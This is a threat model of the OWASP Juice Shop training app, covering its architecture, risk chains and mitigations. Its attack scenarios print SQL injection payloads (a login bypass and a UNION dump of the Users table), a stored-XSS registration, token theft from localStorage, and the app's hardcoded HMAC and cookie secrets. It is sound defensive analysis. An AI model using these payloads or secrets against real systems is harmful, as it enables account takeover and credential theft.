# Threat Model — OWASP Juice Shop

> | Field | Value |
> |-------|-------|
> | Project | OWASP Juice Shop v19.2.1 |
> | Repository | https://github.com/juice-shop/juice-shop |
> | Team Owner | OWASP Juice Shop project |
> | Asset Classification | Tier 1 (intentionally vulnerable — training/demo platform) |
> | Compliance Scope | OWASP Top 10, OWASP ASVS |
> | Deployment | Docker (distroless Node.js 24) · Express monolith |

---

## Changelog

| Version | Date | Mode | Summary |
|---------|------|------|---------|
| v1 | 2026-04-14 | full | Initial assessment — 42 threats across 8 components. 9 Critical, 18 High, 9 Medium, 6 Low. |

---

## Table of Contents

1. [Management Summary](#management-summary)
   - [Verdict](#verdict)
   - [Top Risks](#top-risks)
   - [Worst Case Scenarios](#-worst-case-scenarios)
   - [Architecture Assessment](#architecture-assessment)
   - [Follow-up Actions](#follow-up-actions)
   - [Operational Strengths](#operational-strengths)
2. [Critical Attack Chain](#critical-attack-chain)
3. [System Overview](#1-system-overview)
4. [Architecture Diagrams](#2-architecture-diagrams)
   - [2.1 System Context](#21-system-context)
   - [2.2 Containers](#22-containers)
   - [2.3 Technology Architecture](#23-technology-architecture)
   - [2.4 Security Architecture Assessment](#24-security-architecture-assessment)
5. [Attack Walkthroughs](#3-attack-walkthroughs)
6. [Assets](#4-assets)
7. [Attack Surface](#5-attack-surface)
   - [5.1 Unauthenticated Entry Points](#51-unauthenticated-entry-points-7)
   - [5.2 Authenticated Entry Points](#52-authenticated-entry-points-5)
8. [Trust Boundaries](#6-trust-boundaries)
9. [Identified Security Controls](#7-identified-security-controls)
10. [Threat Register](#8-threat-register)
    - [8.1 Critical (9)](#81-critical-9)
    - [8.2 High (18)](#82-high-18)
    - [8.3 Medium (9)](#83-medium-9)
    - [8.4 Low (6)](#84-low-6)
11. [Mitigation Register](#9-mitigation-register)
    - [P1 — Immediate](#p1--immediate)
    - [P2 — This Sprint](#p2--this-sprint)
    - [P3 — Next Quarter](#p3--next-quarter)
    - [P4 — Backlog](#p4--backlog)
12. [Out of Scope](#10-out-of-scope)
- [Appendix: Run Statistics](#appendix-run-statistics)

---

## Management Summary

### Verdict

🔴 **Critical security posture — not suitable for production deployment in current state.**

- **Hardcoded RSA private key in public source code** enables any developer or Docker image user to forge administrator JWTs and authenticate as any user without credentials.
- **SQL injection on both the login and product search endpoints** allows unauthenticated full database extraction including all user credentials.
- **Remote code execution via the B2B order eval endpoint** gives an authenticated attacker a server shell through a known sandbox escape.
- **Ancient JWT library (express-jwt 0.1.3 / jsonwebtoken 0.4.0)** accepts algorithm:none tokens, bypassing signature verification entirely.

Juice Shop's architecture combines deliberately introduced vulnerabilities (for training) with structural defects that compound their impact. The system has no API gateway, no WAF, no CSP, wildcard CORS, and MD5 password hashing. These structural weaknesses mean that any single Critical finding chains to catastrophic outcome with minimal attacker effort.

### Top Risks

| Severity | ID | Description | Impact | Mitigation | Effort |
|---|---|---|---|---|---|
| 🔴 | [T-001](#t-001) | Hardcoded RSA private key | Forge admin JWT offline | [M-001](#m-001) — Remove hardcoded secrets | Medium |
| 🔴 | [T-002](#t-002) | SQL injection on login | Unauthenticated admin login | [M-002](#m-002) — Parameterized queries | Low |
| 🔴 | [T-003](#t-003) | JWT alg:none bypass | Forge any user token | [M-003](#m-003) — Upgrade JWT library | Medium |
| 🔴 | [T-006](#t-006) | MD5 password hashing | Full plaintext password dump | [M-006](#m-006) — Replace with bcrypt | Medium |
| 🔴 | [T-007](#t-007) | UNION SQL injection on search | Full DB exfiltration | [M-002](#m-002) — Parameterized queries | Low |
| 🔴 | [T-022](#t-022) | Active sessions enumerable | Impersonate any user | [M-009](#m-009) — RBAC fix | Medium |
| 🔴 | [T-025](#t-025) | XXE in XML upload | Local file read / SSRF | [M-017](#m-017) — Disable noent | Low |
| 🔴 | [T-029](#t-029) | RCE via B2B eval endpoint | Server shell | [M-020](#m-020) — Remove eval | High |
| 🔴 | [T-042](#t-042) | Admin registration via role param | Privilege escalation | [M-009](#m-009) — Strip role field | Medium |
| 🟠 | [T-004](#t-004) | JWT in localStorage | Token theft via XSS | [M-004](#m-004) — httpOnly cookie | High |
| 🟠 | [T-008](#t-008) | /ftp directory listing | KeePass DB + business docs | [M-007](#m-007) — Restrict access | Low |
| 🟠 | [T-024](#t-024) | No audit logging | No forensic trail | [M-016](#m-016) — Audit logger | Medium |
| 🟠 | [T-027](#t-027) | SSRF via profile image URL | Internal network probing | [M-019](#m-019) — URL validation | Low |
| 🟠 | [T-039](#t-039) | Rate limit bypass via X-Forwarded-For | Unlimited brute-force | [M-027](#m-027) — Fix keyGenerator | Low |

_Legend: 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Low_

### ⚠ Worst Case Scenarios

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 16px 20px; margin: 0;">

**Scenario 1 — Unauthenticated full database exfiltration:** An attacker sends `POST /rest/user/login` with `email=' OR 1=1--` to bypass authentication and receive an admin JWT. They then query `GET /rest/products/search?q=' UNION SELECT id,email,password,role,NULL,NULL,NULL,NULL FROM Users--` to dump all 40,000+ user email/password pairs. Since passwords are MD5-hashed without salt, the entire credential database is cracked in minutes using freely available rainbow tables.

**Scenario 2 — Remote code execution from authenticated session:** An attacker registers as a customer (or exploits SQL injection for a session), then calls `POST /b2b/v2/orders` with a prototype-pollution payload in `orderLinesData` that escapes the notevil sandbox. The resulting RCE runs as the Node.js process user, giving full read/write access to the container filesystem, the in-process SQLite database, and all secrets.

**Scenario 3 — Offline JWT forgery to administrator:** Any person with access to the public GitHub repository extracts the hardcoded RSA private key from `lib/insecurity.ts:23`. They use it to sign a JWT with `{ role: 'admin' }` and submit it to any protected admin endpoint — no password, no 2FA, no rate limit applies. Combined with T-022, they can also enumerate all currently active session tokens.

_See [Critical Attack Chain](#critical-attack-chain) for the visual attack flows._

</blockquote>

### Architecture Assessment

The following table identifies structural design defects that amplify the impact of individual vulnerabilities.

| Severity | Layer | Defect | Consequence | Enables |
|---|---|---|---|---|
| 🔴 | Auth | **Hardcoded credentials** — RSA private key and HMAC secret in source code | Authentication boundary is meaningless; anyone with source access can forge any identity | [T-001](#t-001) — JWT forgery · [T-033](#t-033) — Coupon forge |
| 🔴 | Database | **No parameterization** — raw SQL string interpolation in login and search | Every string input is a potential SQL injection vector reaching the entire DB | [T-002](#t-002) — Login bypass · [T-007](#t-007) — UNION dump |
| 🔴 | Auth | **Broken JWT library** — express-jwt 0.1.3 / jsonwebtoken 0.4.0 | Signature validation bypassed via alg:none; 8+ major versions of security fixes missing | [T-003](#t-003) — alg:none bypass |
| 🟠 | Execution | **Eval-based execution** — notevil sandbox for B2B orders | Known sandbox escape = RCE with server privileges | [T-029](#t-029) — RCE |
| 🟠 | Data | **In-process databases** — SQLite and marsdb in same process as web server | SQL/NoSQL injection has zero network hop to full DB; no isolation layer | [T-031](#t-031) — DB exposure |
| 🟠 | Network | **No perimeter defense** — direct port 3000, no WAF, wildcard CORS, no CSP | Every vulnerability is directly reachable from the internet; no compensating controls | [T-015](#t-015) — CSRF · [T-017](#t-017) — XSS |

_Legend: 🔴 Critical · 🟠 High_

### Follow-up Actions

| Priority | Mitigation | Addresses | Effort |
|---|---|---|---|
| **P1 — Immediate** | [M-001](#m-001) — Remove hardcoded secrets | [T-001](#t-001) — JWT key · [T-033](#t-033) — HMAC | Medium |
| **P1 — Immediate** | [M-002](#m-002) — Parameterized queries | [T-002](#t-002) — Login SQLi · [T-007](#t-007) — Search SQLi | Low |
| **P1 — Immediate** | [M-003](#m-003) — Upgrade JWT library | [T-003](#t-003) — alg:none | Medium |
| **P1 — Immediate** | [M-004](#m-004) — httpOnly cookie for JWT | [T-004](#t-004) · [T-019](#t-019) — Token theft | High |
| **P1 — Immediate** | [M-006](#m-006) — Replace MD5 with bcrypt | [T-006](#t-006) — Weak hashing | Medium |
| **P1 — Immediate** | [M-007](#m-007) — Restrict /ftp, /encryptionkeys | [T-008](#t-008) · [T-011](#t-011) · [T-028](#t-028) | Low |
| **P1 — Immediate** | [M-008](#m-008) — Restrict /metrics, /support/logs | [T-009](#t-009) · [T-010](#t-010) | Low |
| **P1 — Immediate** | [M-009](#m-009) — RBAC + role strip | [T-012](#t-012) · [T-022](#t-022) · [T-042](#t-042) | Medium |
| **P1 — Immediate** | [M-014](#m-014) — Remove bypassSecurityTrustHtml | [T-017](#t-017) · [T-018](#t-018) · [T-020](#t-020) | Medium |
| **P1 — Immediate** | [M-017](#m-017) — Disable XXE noent | [T-025](#t-025) — XXE | Low |
| **P1 — Immediate** | [M-020](#m-020) — Remove B2B eval | [T-029](#t-029) — RCE | High |
| **P2 — This Sprint** | [M-005](#m-005) — Enforce current password check | [T-005](#t-005) | Low |
| **P2 — This Sprint** | [M-010](#m-010) — Fix IDOR on basket | [T-013](#t-013) | Medium |
| **P2 — This Sprint** | [M-011](#m-011) — Resource limits on uploads | [T-014](#t-014) · [T-041](#t-041) | Low |
| **P2 — This Sprint** | [M-012](#m-012) — Restrict CORS + CSRF | [T-015](#t-015) | Medium |
| **P2 — This Sprint** | [M-013](#m-013) — Fix open redirect allowlist | [T-016](#t-016) | Low |
| **P2 — This Sprint** | [M-016](#m-016) — Audit logging | [T-024](#t-024) | Medium |
| **P2 — This Sprint** | [M-018](#m-018) — Fix Zip Slip | [T-026](#t-026) | Low |
| **P2 — This Sprint** | [M-019](#m-019) — SSRF URL validation | [T-027](#t-027) | Low |
| **P2 — This Sprint** | [M-022](#m-022) — NoSQL parameterization | [T-032](#t-032) | Low |
| **P2 — This Sprint** | [M-027](#m-027) — Fix rate limit keyGenerator | [T-039](#t-039) | Low |
| **P3 — Next Quarter** | [M-015](#m-015) — CSP + HSTS | [T-021](#t-021) | Medium |
| **P3 — Next Quarter** | [M-021](#m-021) — Isolate SQLite | [T-031](#t-031) | High |
| **P3 — Next Quarter** | [M-023](#m-023) — Pin CI Actions SHAs | [T-034](#t-034) | Low |
| **P3 — Next Quarter** | [M-024](#m-024) — Remove --unsafe-perm | [T-035](#t-035) · [T-038](#t-038) | Low |
| **P3 — Next Quarter** | [M-025](#m-025) — CI/CD secrets rotation | [T-036](#t-036) | Medium |

### Operational Strengths

| Control | What it provides | Limitation |
|---|---|---|
| TOTP 2FA Support | Optional second factor for high-value accounts | Not enforced; bypassable via JWT forgery (T-001/T-003) |
| CodeQL in CI | Automated SAST on every push | Excludes data/static/codefixes; misses runtime injection patterns |
| CycloneDX SBOM generation | Machine-readable dependency inventory | Not integrated with vulnerability scanner |
| Card number masking | PCI-relevant — last 4 digits only in API responses | Full number stored in DB; accessible via SQLi |
| Distroless Docker final image | Reduced attack surface; no shell in container | Compromise still possible via RCE in app process |
| Morgan HTTP logging | Request audit trail for incident response | No user identity correlation; no structured security events |
| sanitize-filename on uploads | Prevents directory traversal in filenames | Does not prevent Zip Slip traversal in ZIP entries |
| File size limits (200KB) | Mitigates some DoS vectors | YAML bomb can still exhaust memory within limit |

**Bottom line:** Juice Shop has scaffolding for several security controls, but every control has a critical gap or has been intentionally weakened. The combination of hardcoded secrets, broken crypto, unauthenticated data exposure, and no perimeter defense makes this unsuitable for any production exposure.

---

## Critical Attack Chain

The diagrams below show how Critical findings combine into distinct attacker workflows. Each chain node links to its full detail row in Section 8.1.

### Chain 1 — Unauthenticated Full Compromise

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Unauthenticated<br/>attacker"]):::crit
    T2["T-002<br/>SQLi Login Bypass"]:::crit
    T7["T-007<br/>UNION SELECT Dump"]:::crit
    T6["T-006<br/>MD5 Hash Crack"]:::crit
    Goal(["All 40k+ user<br/>credentials plaintext"]):::crit
    Start -->|"POST /rest/user/login<br/>email=' OR 1=1--"| T2
    T2 -->|"admin JWT issued"| T7
    T7 -->|"GET /rest/products/search<br/>UNION SELECT Users"| T6
    T6 -->|"rainbow table<br/>instant crack"| Goal
```

**Key takeaway:** Unauthenticated SQL injection on the login endpoint yields an admin JWT and then, via the search endpoint, the entire credential database — crackable to plaintext in minutes due to unsalted MD5.

### Chain 2 — Offline JWT Forgery to RCE

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Attacker reads<br/>public GitHub repo"]):::crit
    T1["T-001<br/>Hardcoded RSA Key"]:::crit
    T3["T-003<br/>alg:none Alternative"]:::crit
    T42["T-042<br/>Register as Admin"]:::crit
    T29["T-029<br/>RCE via B2B Eval"]:::crit
    Goal(["Shell on server"]):::crit
    Start -->|"extract private key<br/>lib/insecurity.ts:23"| T1
    T1 -->|"sign JWT role=admin"| T29
    T3 -->|"strip signature<br/>alg:none"| T29
    T42 -->|"POST /api/Users<br/>role=admin"| T29
    T29 -->|"POST /b2b/v2/orders<br/>sandbox escape"| Goal
```

**Key takeaway:** Three independent paths (hardcoded key, alg:none, registration role injection) all lead to an authenticated admin session that unlocks the B2B eval endpoint for remote code execution — any single path is sufficient.

### Chain 3 — Session Harvest via XSS

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Attacker registers<br/>malicious email"]):::crit
    T18["T-018<br/>Stored XSS in Admin Panel"]:::crit
    T22["T-022<br/>Session Token Enumeration"]:::crit
    T19["T-019<br/>localStorage Theft"]:::crit
    Goal(["All active sessions<br/>compromised"]):::crit
    Start -->|"email=<script>...</script>"| T18
    T18 -->|"admin views user list<br/>XSS executes"| T19
    T19 -->|"localStorage.getItem('token')"| T22
    T22 -->|"GET /rest/user/authentication-details<br/>enumerate all sessions"| Goal
```

**Key takeaway:** A single malicious registration triggers stored XSS in the admin panel, which steals the admin JWT from localStorage and allows enumeration of every active user session.

### Quick Reference — Critical Findings

| ID | Title | Component | Mitigation |
|----|-------|-----------|------------|
| [T-001](#t-001) | Hardcoded RSA Private Key | Auth Service | [M-001](#m-001) — Remove hardcoded secrets |
| [T-002](#t-002) | SQL Injection on Login | Auth Service | [M-002](#m-002) — Parameterized queries |
| [T-003](#t-003) | JWT alg:none Bypass | Auth Service | [M-003](#m-003) — Upgrade JWT library |
| [T-006](#t-006) | MD5 Password Hashing | Auth Service | [M-006](#m-006) — Replace with bcrypt |
| [T-007](#t-007) | UNION SQL Injection on Search | REST API | [M-002](#m-002) — Parameterized queries |
| [T-022](#t-022) | Active Session Token Enumeration | Admin Panel | [M-009](#m-009) — RBAC enforcement |
| [T-025](#t-025) | XXE via XML Upload | File Upload Service | [M-017](#m-017) — Disable noent |
| [T-029](#t-029) | RCE via B2B Eval Endpoint | B2B Order API | [M-020](#m-020) — Remove eval |
| [T-042](#t-042) | Admin Registration via Role Parameter | Frontend SPA | [M-009](#m-009) — Strip role field |

---

## 1. System Overview

OWASP Juice Shop is a deliberately insecure full-stack web application built to serve as a realistic training environment for application security testing, penetration testing, and secure coding education. It is used by organizations worldwide for security awareness training, CTF competitions, and developer education. Version 19.2.1 runs on Node.js 20–24 with an Angular 18 SPA frontend and an Express 4 monolith backend.

**Deployment context:** The application ships as a Docker image (`ghcr.io/bkimminich/juice-shop`) and runs as a single container exposing port 3000. No reverse proxy, WAF, API gateway, or network segmentation is present in the default deployment. Both SQLite (via Sequelize) and MongoDB-equivalent (marsdb) databases run in-process within the same Node.js process.

**Context sources used:** None (external context not configured; `.threat-modeling-context.md` from prior run).

**Compliance scope:** OWASP Top 10 2021, OWASP ASVS 4.0.

**Security impression:** The codebase intentionally contains a high density of vulnerabilities spanning every OWASP Top 10 category. The threat model documents these as they would appear in a real production application, providing a complete picture of their architectural impact and remediation paths. Structural defects — hardcoded secrets, broken crypto, in-process databases, no perimeter defense — compound the impact of every individual finding to systemic levels.

---

## 2. Architecture Diagrams

The following diagrams model the system at multiple abstraction levels using the C4 model. Security-sensitive components are highlighted in red. The system uses a Moderate complexity tier: a monolithic Express backend with an Angular SPA frontend, in-process databases, and no microservices decomposition.

### 2.1 System Context

The Context view shows which actors interact with the system, which external services it depends on, and which trust zones each actor sits in. Red boxes mark components that directly expose attack surface.

```mermaid
graph TD
    subgraph INTERNET["Public Internet — untrusted"]
        UA(["Anonymous User"])
        AT(["Authenticated User"])
        ADM(["Admin User"])
        ATTK(["Attacker"])
        GOOGLE["Google OAuth\nUserInfo API\nSaaS"]
    end
    subgraph APP["Application Zone — port 3000"]
        %% component: rest-api
        JS["OWASP Juice Shop\nExpress 4 Monolith\nNode.js 20-24\nDocker / distroless"]:::risk
    end
    subgraph DATA["Data Tier — in-process"]
        %% component: sqlite-db
        SQ[("SQLite\nSequelize ORM\nin-process")]:::risk
        MG[("marsdb\nMongoDB-compat\nin-process")]
    end
    UA -->|"HTTP · port 3000"| JS
    AT -->|"HTTP · port 3000\nJWT Bearer"| JS
    ADM -->|"HTTP · port 3000\nJWT Bearer"| JS
    ATTK -->|"HTTP · port 3000\nunauthenticated"| JS
    JS -->|"OAuth userinfo · HTTPS"| GOOGLE
    JS -->|"SQL · in-process"| SQ
    JS -->|"NoSQL · in-process"| MG
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef saas fill:#e1bee7,stroke:#7b1fa2
    class GOOGLE saas
%% Trust Boundary Key:
%% Public Internet → App Zone: direct TCP 3000, no WAF, no API gateway
%% App Zone → Data Tier: no network hop — in-process function call
```

**Key takeaway:** Every external actor — including the attacker — reaches the monolith directly on port 3000 with no intervening security layer, and all databases are co-located in the same process, making SQL/NoSQL injection a one-hop full-database extraction.

### 2.2 Containers

The Container view shows the deployable units and their security-relevant internal structure.

```mermaid
graph TD
    subgraph INTERNET["Public Internet — untrusted"]
        Browser["Browser\nAngular SPA\nToken in localStorage"]:::risk
        AttBr(["Attacker"])
    end
    subgraph DOCKER["Docker Container — port 3000"]
        subgraph EXPRESS["Express Monolith — Node.js 24"]
            %% component: auth-service
            AUTH["Auth Service\nlib/insecurity.ts\nJWT RS256 — key HARDCODED"]:::risk
            %% component: rest-api
            API["REST API\nExpress routes\nSequelize + marsdb"]:::risk
            %% component: file-upload
            UPLOAD["File Upload\nXXE · Zip Slip · SSRF\nroutes/fileUpload.ts"]:::risk
            %% component: b2b-api
            B2B["B2B Order API\nnotevil eval\nRoutes/b2bOrder.ts"]:::risk
            %% component: admin-panel
            ADMIN["Admin Panel\nSession enumeration\nroutes/authenticatedUsers.ts"]:::risk
        end
        subgraph INPROC["In-Process Databases"]
            %% component: sqlite-db
            SQ[("SQLite\nUsers · Products\nOrders · Baskets")]:::risk
            MDB[("marsdb\nReviews · Orders")]
        end
        FS["Filesystem\n/ftp · /logs · /encryptionkeys\nPublicly exposed"]:::risk
    end
    Browser -->|"HTTP REST\nAngular HTTPClient"| API
    AttBr -->|"HTTP · port 3000"| API
    API --> AUTH
    API --> UPLOAD
    API --> B2B
    API --> ADMIN
    AUTH -->|"SQL — raw concat"| SQ
    API -->|"SQL — raw concat"| SQ
    API -->|"NoSQL — raw _id"| MDB
    API -->|"File I/O"| FS
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
%% Trust Boundary Key:
%% Internet → Express: direct TCP, no authentication at perimeter
%% Express → SQLite: in-process call, SQL injection = full DB read
%% Express → Filesystem: direct fs.*; /ftp and /encryptionkeys served unauthenticated
```

**Key takeaway:** Every security-critical component — authentication, API, file handling, and eval execution — runs in the same Node.js process with direct access to all databases and the filesystem, so any single code execution vulnerability yields full system compromise.

### 2.3 Technology Architecture

This diagram shows the runtime middleware stack from top to bottom. Nodes in red carry at least one Critical or High threat.

```mermaid
graph TD
    subgraph CLIENT["Browser"]
        ANG["Angular 18 SPA\nToken: localStorage\nRouter + Material UI"]:::risk
    end
    subgraph NETWORK["Network — no TLS in default config"]
        HTTP["HTTP · port 3000\nNo WAF · No proxy\nNo rate limit at perimeter"]:::risk
    end
    subgraph MIDDLEWARE["Express Middleware Stack"]
        COMP["compression · cors(wildcard)\nhelmet(partial) · morgan"]:::risk
        PARSE["bodyParser.text · json\ncookieParser('kekse')\nmulter(200KB)"]
        AUTH_MW["express-jwt 0.1.3\njws.verify (alg:none OK)\nisAuthorized middleware"]:::risk
    end
    subgraph ROUTES["Route Handlers"]
        LOGIN["POST /rest/user/login\nRaw SQL concat"]:::risk
        SEARCH["GET /rest/products/search\nRaw SQL concat"]:::risk
        B2B_R["POST /b2b/v2/orders\nnotevil eval"]:::risk
        UPLOAD_R["POST /file-upload\nXXE · ZipSlip"]:::risk
        MISC["50+ other routes\nFinale-REST auto-API"]
    end
    subgraph DB["In-Process Data Layer"]
        SEQ["Sequelize ORM\nSQLite — in-process"]:::risk
        MARS["marsdb\nmongoDB-compat"]
    end
    ANG -->|"HTTP REST · Angular HTTPClient"| HTTP
    HTTP --> COMP
    COMP --> PARSE
    PARSE --> AUTH_MW
    AUTH_MW --> LOGIN
    AUTH_MW --> SEARCH
    AUTH_MW --> B2B_R
    AUTH_MW --> UPLOAD_R
    AUTH_MW --> MISC
    LOGIN -->|"Raw SQL"| SEQ
    SEARCH -->|"Raw SQL"| SEQ
    B2B_R -->|"notevil eval"| SEQ
    MISC --> MARS
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
%% Trust Boundary Key:
%% Internet → Middleware: no TLS enforcement, no IP restriction
%% Middleware → Auth: JWT validation bypassable via alg:none
%% Auth → DB: raw SQL string concatenation, no parameterization
```

**Key takeaway:** The middleware stack provides minimal security — CORS is wildcard, helmet is partial, JWT validation accepts alg:none, and the two highest-traffic data endpoints use raw SQL concatenation directly into the in-process SQLite database.

### 2.4 Security Architecture Assessment

This section evaluates structural security patterns rather than individual code defects. Each subsection assesses the architecture-level implementation and its gaps.

#### 2.4.1 Architecture Patterns

The following table evaluates which standard security architecture patterns are implemented. Each pattern is rated based on code and configuration evidence.

| Pattern | Status | Assessment |
|---------|--------|------------|
| API Gateway | ❌ Absent | No centralized gateway in front of Express. Rate limiting, authentication, and input validation must be implemented per-route, leading to inconsistent enforcement across 50+ endpoints. |
| BFF (Backend for Frontend) | ❌ Absent | The Angular SPA communicates directly with the same API used by B2B clients. JWT tokens are stored in localStorage, exposing them to any XSS. A BFF would isolate the browser session from server-side state. |
| Defense-in-Depth | ❌ Absent | No layered controls — a single injection vulnerability reaches the full database. No WAF, no rate limiting at the perimeter, no input validation middleware, no anomaly detection. |
| Separation of Concerns | ⚠️ Partial | Auth logic is centralized in `lib/insecurity.ts` but the same file contains the hardcoded private key, making the trust boundary meaningless. |
| Least Privilege | ⚠️ Partial | Application process runs as non-root (65532) in Docker. However, the Node.js process has read/write access to all databases, the filesystem, and can execute child processes via eval. |
| Secrets Management | ❌ Absent | RSA private key, HMAC secret, and cookie secret are hardcoded in source code. No environment variable injection, no secrets manager, no rotation capability. |
| Network Segmentation | ❌ Absent | No separate network for the database tier. SQLite and marsdb run in the same process as the web server. No network namespace isolation. |
| Secure Defaults | ❌ Absent | CORS is wildcard, helmet is partial (no CSP/HSTS), XSS filter commented out, cookies lack httpOnly/Secure, cookie secret is trivial. |

**Assessment:** 1 of 8 patterns is partially implemented (Separation of Concerns). The absence of secrets management, API gateway, and defense-in-depth means that individual vulnerabilities chain to complete compromise without encountering any architectural barrier.

#### 2.4.2 Key Architectural Risks

The following structural design decisions amplify or enable individual vulnerabilities. These are architecture-level defects — fixing individual threats without addressing them leaves the system exposed to the same attack class through different vectors.

| Risk | Structural Risk | Why this matters | Linked Threats |
|------|-----------------|-----------------|----------------|
| 🔴 Critical | **No secret isolation** — private keys and HMAC secrets hardcoded in source code | Any code access (developer laptop, GitHub, built Docker image) yields all signing material. A correctly designed architecture would store signing keys in a KMS/Vault with no code-accessible copy. | [T-001](#t-001) — JWT forgery<br/>[T-033](#t-033) — Coupon forge |
| 🔴 Critical | **No SQL parameterization** — raw string interpolation in Sequelize queries | Every user-controlled string field that reaches a query is a potential full-database injection. ORM usage without parameterization provides false security — developers believe they are protected. | [T-002](#t-002) — Login SQLi<br/>[T-007](#t-007) — Search SQLi |
| 🔴 Critical | **Eval-based execution** — notevil sandbox for B2B order processing | JavaScript eval with user input as the expression is RCE-by-design. No amount of sandboxing eliminates the risk — the "safe" eval library has known escapes. Architecture should parse structured data, not evaluate code. | [T-029](#t-029) — RCE<br/>[T-030](#t-030) — DoS |
| 🟠 High | **In-process databases** — SQLite and marsdb co-located with application | SQL/NoSQL injection results in full database extraction with zero network traversal. A correctly designed architecture would place the database in a separate process/container with a network boundary. | [T-031](#t-031) — DB exposure<br/>[T-032](#t-032) — NoSQL injection |
| 🟠 High | **No perimeter defense** — direct port 3000 access with wildcard CORS | Every vulnerability is directly reachable from the internet. No WAF, no rate limiting at the perimeter, no CDN to absorb reconnaissance. | [T-015](#t-015) — CSRF<br/>[T-014](#t-014) — DoS |

#### 2.4.3 Secret Management

```mermaid
graph TD
    subgraph CURRENT["Current State — Insecure"]
        SRC["lib/insecurity.ts\nRSA Private Key (2048-bit)\nHMAC Secret\nCookie Secret"]:::risk
        CODE["Source Code / Docker Image\npublicly readable"]:::risk
        SIGN["jwt.sign()\nauthorize()"]
        HMAC_F["hmac() / deluxeToken()"]
        COOKIE["cookieParser('kekse')"]
    end
    subgraph TARGET["Target State — Secure"]
        ENV["Environment Variables\nor Secrets Manager"]
        SIGN2["jwt.sign()\nprocess.env.JWT_PRIVATE_KEY"]
        HMAC2["hmac()\nprocess.env.HMAC_SECRET"]
        COOK2["cookieParser\nprocess.env.COOKIE_SECRET"]
    end
    SRC -->|"hardcoded in"| CODE
    CODE -->|"used by"| SIGN
    CODE -->|"used by"| HMAC_F
    CODE -->|"used by"| COOKIE
    ENV -->|"injected at startup"| SIGN2
    ENV -->|"injected at startup"| HMAC2
    ENV -->|"injected at startup"| COOK2
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
```

**Key takeaway:** All application secrets currently live in source code; the target architecture loads them from environment variables or a secrets manager, eliminating the hardcoded-secret attack surface entirely.

**Current state.** The RSA private key for JWT signing is hardcoded at [lib/insecurity.ts:23](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:23); the HMAC secret for coupon generation at [lib/insecurity.ts:45](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:45); the cookie secret at [server.ts:289](vscode://file//home/mrohr/juice-shop/server.ts:289). All three are in the public GitHub repository.

**Structural defects:**

- RSA private key hardcoded at [lib/insecurity.ts:23](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:23) — anyone with repo read access can forge any JWT
- HMAC secret 'pa4qacea4VK9t9nGv7yZtwmj' at [lib/insecurity.ts:45](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:45) — generates valid discount coupons
- Cookie secret 'kekse' at [server.ts:289](vscode://file//home/mrohr/juice-shop/server.ts:289) — trivially weak, enables cookie forgery
- No rotation mechanism — changing secrets requires code change and redeploy
- No secrets manager integration at any tier

**Impact.** An attacker reading the public repository can forge administrator JWTs, generate unlimited discount coupons, and forge signed cookie values — all without interacting with the running application.

**Target architecture.** Load all signing material from `process.env.*` at startup, throw on missing values, and use a key rotation mechanism (HashiCorp Vault or cloud KMS) in production environments.

**Linked threats:**

- [T-001](#t-001) — Hardcoded RSA private key
- [T-033](#t-033) — Hardcoded HMAC coupon secret
- [T-040](#t-040) — Hardcoded cookie secret

#### 2.4.4 Authentication

```mermaid
graph TD
    subgraph CLIENT["Browser"]
        LOGIN_FORM["POST /rest/user/login\nRaw SQL — SQLi possible"]:::risk
        LS["localStorage\nJWT token — XSS extractable"]:::risk
    end
    subgraph SERVER["Express Monolith"]
        LOGIN_ROUTE["routes/login.ts:34\nstring concat SQL"]:::risk
        INSECURITY["lib/insecurity.ts\njwt.sign — key HARDCODED\njws.verify — alg:none OK"]:::risk
        VERIFY["express-jwt 0.1.3\nalgorithm from token header"]:::risk
        PROTECTED["Protected Routes\nisAuthorized() middleware"]
    end
    LOGIN_FORM -->|"POST credentials"| LOGIN_ROUTE
    LOGIN_ROUTE -->|"raw SQL to SQLite"| INSECURITY
    INSECURITY -->|"JWT in response body"| LS
    LS -->|"Authorization: Bearer"| VERIFY
    VERIFY -->|"decoded user"| PROTECTED
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
```

**Key takeaway:** The authentication chain has four independent critical breaks — SQL injection bypasses credential check, alg:none bypasses signature verification, the hardcoded private key enables offline forgery, and localStorage storage makes the token XSS-stealable — any single break yields authenticated access.

**Current state.** RS256 JWT issued on login at [routes/login.ts:34](vscode://file//home/mrohr/juice-shop/routes/login.ts:34) via raw SQL; signed with hardcoded private key at [lib/insecurity.ts:56](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:56); verified by jws.verify at [lib/insecurity.ts:57](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:57) without algorithm enforcement.

**Structural defects:**

- SQL injection on login at [routes/login.ts:34](vscode://file//home/mrohr/juice-shop/routes/login.ts:34) — credential check bypassed entirely
- express-jwt 0.1.3 at [package.json:L133](vscode://file//home/mrohr/juice-shop/package.json:133) — 8+ major versions behind; alg:none accepted
- jws.verify without algorithm restriction at [lib/insecurity.ts:57](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:57) — attacker strips signature
- Signing key co-located with signing code at [lib/insecurity.ts:23](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:23) — no key isolation
- Token stored in localStorage at [Services/request.interceptor.ts:13](vscode://file//home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13) — XSS extractable
- Token revocation not possible — session in memory map, expires only after 6 hours

**Impact.** Any of three independent authentication breaks yields an admin session without knowing credentials. Combined with T-022 (session enumeration), a single compromised token expands to all active sessions.

